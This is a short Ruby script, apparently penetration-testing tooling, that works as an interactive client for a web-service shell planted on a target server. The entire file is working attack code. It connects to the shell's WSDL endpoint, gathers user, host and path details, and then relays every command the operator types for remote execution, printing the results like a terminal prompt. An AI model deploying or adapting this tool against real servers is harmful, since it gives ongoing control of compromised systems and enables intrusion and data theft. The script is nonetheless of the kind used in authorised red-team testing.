#!/usr/bin/ruby

# Author: @felmoltor
# Summary: This script is just a client for the WSShell globaly deployed Web Service Shell.
# Date: 10/2013

# TODO: Encode response in base64
# TODO: Bug with Axis2. Change the requests headers it an Axis2 is using <base> tag to redirect to an internal IP. Configure endpoint on client.

require 'savon'
require 'optparse'

class WSShellClient
    attr_accessor :username, :hostname, :path, :userid
    @wsdlShellURL = nil
    @outputLog = "shell_access.log"

    def initialize(wsdlwsshellurl=nil, outputlog="shell_access.log")
        @wsdlShellURL = wsdlwsshellurl
        @outputLog = outputlog
        @username = "<NO_USER>"
        @userid = -1
        @hostname = "<NO_HOSTNAME>"
        @path = "<NO_PATH>"
        @wsshellclient = Savon.client(wsdl: @wsdlShellURL)
        @wsshellclient.globals[:logger] = Logger.new(@outputLog)
        @wsshellclient.globals[:logger].level = 10
        getCurrentContext
    end
    
    #exec_cmd, get_file_list, get_info, get_root_dir, read_file

    def executeCommand(cmd)
        response = @wsshellclient.call(:exec_cmd, message: {cmd: cmd})
        return response.body[:exec_cmd_response][:return]
    end

    def getRawAvailableFunctions
        response = @wsshellclient.operations.sort.join("\n")
        return response
    end

    def getSystemInfo
        response = @wsshellclient.call(:get_info)
        return response.body[:get_info_response][:return]
    end
    
    def getIdInfo
        # uid=1000(harvester) gid=1001(harvester) groups=1001(harvester),27(sudo),1000(vboxsf)
        idoutput=executeCommand("id")
        ida = idoutput.split(' ')
        @userid=ida[0].split('=')[1].split('(')[0]
        @username=ida[0].split('=')[1].split('(')[1].gsub(")","")
    end

    def getCurrentContext
        getIdInfo
        @shell=executeCommand("echo $SHELL")
        @path=executeCommand("pwd")
        @hostname=executeCommand("hostname")
    end

end

#####################

########
# MAIN #
########

if ARGV[0].nil?
    puts "Error: Se necesita la URL del wsdl de la WSShell"
    exit(1)
end

wsdl = ARGV[0]

wsshell = WSShellClient.new(wsdlwsshellurl = wsdl, outputlog = "wsshell_#{DateTime.now.strftime("%Y%m%d_%H%M%S")}.log")

puts "="*220
puts "= SYSTEM INFORMATION ="
puts "= System Information: #{wsshell.getSystemInfo}"
puts "= Available WS calls: #{wsshell.getRawAvailableFunctions}"
puts "="*20
puts 
while(1)
    wsshell.getCurrentContext
    print "#{wsshell.username}@#{wsshell.hostname}:#{wsshell.path}$ "
    c = $stdin.gets.strip
    if c != "exit"
        puts wsshell.executeCommand(c)
    else
        puts "Bye, bye..."
        break
    end
end
